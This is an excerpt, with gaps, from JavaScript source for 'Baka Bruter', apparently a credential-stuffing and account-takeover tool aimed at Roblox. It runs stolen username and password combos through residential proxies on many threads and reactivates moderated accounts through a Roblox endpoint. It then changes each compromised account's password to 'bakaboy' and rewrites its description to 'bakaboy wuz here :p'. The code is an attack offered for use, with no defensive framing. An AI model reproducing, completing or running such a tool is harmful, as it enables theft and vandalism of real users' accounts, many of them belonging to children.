...
Proxy Format (choose one of the below, must be residential proxies)
...
// CONFIG
const THREADS = 100 // don't make longer than the amount of proxies you have (good value:100)
const ignoreCache = true // ignore cache.txt and use all combos regardless if they've been checked before
const changeDescription = "bakaboy wuz here :p" // change "..." to null (no quotes) to not change description
...
const passwordChanger = {
    enabled: true,
    changeTo: "bakaboy", // if varyPasswords is enabled, an underscore and random characters will be added at the end of this, if not then this will be the new password
                            ...
                            if(!token){
                                ...
                                internet.post("https://usermoderation.roblox.com/v1/not-approved/reactivate",null,{
                                    ...
                                    if(passwordChanger.enabled){
                                        const changed = passwordChanger.changeTo+(passwordChanger.varyPasswords ? "_"+genRandomString(6) : "")
...
async function main(){
    console.log("Baka Bruter initiating...")
